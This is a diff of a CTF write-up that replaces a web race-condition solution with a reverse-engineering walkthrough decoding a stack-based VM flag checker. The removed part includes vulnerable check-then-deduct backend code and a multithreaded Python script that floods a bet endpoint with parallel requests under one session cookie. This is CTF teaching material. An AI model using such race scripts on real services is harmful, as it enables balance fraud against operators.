@@ -106,70 +106,89 @@ Kiểm tra lại toàn bộ chuỗi thu được thỏa mãn tất cả 49 đi�
 
 <div class="lang-en" markdown="1">
 
-> **Flag:** `PTITCTF{t0ct0u_r4c1ng_m0nst3r_c0ncurr3ncy_pr0f1t}`
+> **Flag:** `PTITCTF{0nly_th3_f4st_surv1v3_th3_m0nst3rs_ch4s3}`
 
-This challenge was featured in the **PTITCTF 2026 Finals (Pwn / Web)**. The target is a concurrent betting service where players bet tokens on virtual monster races.
 
-The vulnerability is a Time-of-Check to Time-of-Use (TOCTOU) race condition in the balance verification and token deduction workflow.
+This article belongs to the **Reverse Engineering** category in the PTITTCTF 2026 Finals. The attached file is a compressed file `chall.zip` containing the Windows x64 executable file `racing_monster.exe`.
+
+The goal is to simulate the process of multi-round opcode transformations (scheduled rounds) in memory and decode constraint conditions in the flag checking virtual machine.
 
 ---
 
-## Solve Flow
+## Analysis Flow Diagram (Solve Flow)
 
 ```mermaid
 flowchart TD
-    A["Service: Racing Monster Betting System"] --> B["Inspect Bet Endpoint: POST /api/bet {monster_id, amount}"]
-    B --> C["Identify TOCTOU Race Condition: Check balance -> Sleep(100ms) -> Deduct"]
-    C --> D["Absence of database row locking (SELECT ... FOR UPDATE missing)"]
-    D --> E["Construct Multi-threaded Race Script: Send 20 parallel bet requests"]
-    E --> F["All 20 requests pass check phase concurrently using the initial 100 token balance"]
-    F --> G["Account balance updates to multiply winnings upon race completion"]
-    G --> H["Accumulate 1,000,000 tokens to purchase the Golden Monster Flag"]
-    H --> I["Flag: PTITCTF{t0ct0u_r4c1ng_m0nst3r_c0ncurr3ncy_pr0f1t}"]
+    A["Executable file: racing_monster.exe"] --> B["Extract the 697 byte bytecode region at RVA 0x6160"]
+    B --> C["Analyze function sub_140001730: 80 scheduled rounds transform rol8 and carry"]
+    C --> D["Simulate 80 rounds of byte-width rotation and carry accumulation in Python"]
+    D --> E["Verify the FNV-1a hash code after transformation: 0x14650fb0739d0383"]
+    E --> F["Mini virtual machine analysis: 49 instruction blocks check 49 flag characters"]
+    F --> G["Reverse the condition for each block: ((b[9] - b[6]) & 255) ^ b[3]"]
+    G --> H["Restore entire flag string: PTITCTF{0nly_th3_f4st_surv1v3_th3_m0nst3rs_ch4s3}"]
 ```
 
 ---
 
-## Step 1: Identifying the TOCTOU Flaw
+## Step 1: Extract and simulate 80 rounds of Opcode transformation
 
-In the decompiled backend logic:
+Opening the binary file in IDA Pro, we locate the 697 byte long bytecode block at RVA address `0x6160`. Before the virtual machine executes, the function `sub_140001730` performs an 80-cycle bitwise rotation on this byte array:
 
 ```python
-# Vulnerable sequence
-current_balance = db.query_balance(user_id)
-if current_balance >= bet_amount:
-    time.sleep(0.1)  # Context switch window
-    db.deduct_balance(user_id, bet_amount)
-    record_bet(user_id, monster_id, bet_amount)
+def rol8(x, n):
+    x &= 255
+    n %= 8
+    return ((x << n) | (x >> (8 - n))) & 255
+
+# Mô phỏng 80 vòng biến đổi
+for r in range(80):
+    carry = 93 + 17 * r
+    for i in range(len(code)):
+        additive = rol8(165 + 29 * r + 71 * i, r + i)
+        code[i] = rol8(code[i] + additive, (r + i) % 7 + 1) ^ (carry & 255)
+        carry += code[i] + i
 ```
 
-Because `query_balance` and `deduct_balance` are separate queries without atomic transactions or row-level locking, concurrent requests sent within the 100ms window will all pass the balance check.
+Calculate the FNV-1a hash check after 80 rounds to match the protection constant verified by EXE.
 
 ---
 
-## Step 2: Race Condition Exploit
+## Step 2: Analyze virtual machine architecture and compare 49 command blocks
 
-Using Python `concurrent.futures.ThreadPoolExecutor`:
+After completing 80 rounds of shuffling, the byte array becomes the complete virtual machine bytecode. Virtual machines operate according to a simple Stack-based VM mechanism:
+* `0x10`: Push the constant onto the stack (push imm8).
+* `0x11`: Push the `i`th character of the user input key onto the stack.
+* `0x12`: XOR operation of two top stack elements.
+* `0x13`: ADD operation modulo 256.
+* `0x14`: Comparison is not equal (CMP ne).
+* `0x15`: Conditional jump (JZ / JNZ).
+
+Analyzing the first 686 bytes of the virtual machine code array, we see that it is divided into exactly **49 consecutive command blocks**, each block 14 bytes long checks a corresponding character of the flag:
+* Byte `0..2`: Get the $i$ character of the flag.
+* Byte `3..9`: XOR operations of constant $b[3]$, subtraction of constant $b[6]$, addition of constant $b[9]$.
+* Byte `10..13`: Compare results and branch to failure location if discrepancies.
+
+---
+
+## Step 3: Decode the 49 characters of Flag
+
+Because the test expression of each character $i$ has an independent algebraic form: $$\left((b_i[9] - b_i[6]) \bmod 256\right) \oplus b_i[3] == \text{char}_i$$
+
+We write a static Python script that directly extracts constant values ​​from 49 command blocks without running the PE file on the system:
 
 ```python
-import requests
-import concurrent.futures
+answer = []
+for i in range(49):
+    b = code[i * 14 : (i + 1) * 14]
+    char_val = ((b[9] - b[6]) & 255) ^ b[3]
+    answer.append(char_val)
 
-url = "http://target.ptitctf.vn/api/bet"
-cookies = {"session": "victim_session_token"}
-
-def send_bet():
-    return requests.post(url, json={"monster_id": 1, "amount": 100}, cookies=cookies)
-
-# Dispatch 30 simultaneous requests
-with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
-    futures = [executor.submit(send_bet) for _ in range(30)]
-    for f in concurrent.futures.as_completed(futures):
-        print(f.result().json())
+flag = bytes(answer).decode('ascii')
+print("Flag:", flag)
+# Output: PTITCTF{0nly_th3_f4st_surv1v3_th3_m0nst3rs_ch4s3}
 ```
 
-Once Monster 1 wins, the balance multiplies 30x instead of 1x. Buying the Flag item at `/api/shop/buy_flag` succeeds.
+Recheck the entire obtained string that satisfies all 49 conditions of the virtual machine.
 
-⇒ **Flag:** `PTITCTF{t0ct0u_r4c1ng_m0nst3r_c0ncurr3ncy_pr0f1t}`
-
+⇒ **Flag:** `PTITCTF{0nly_th3_f4st_surv1v3_th3_m0nst3rs_ch4s3}`
 </div>
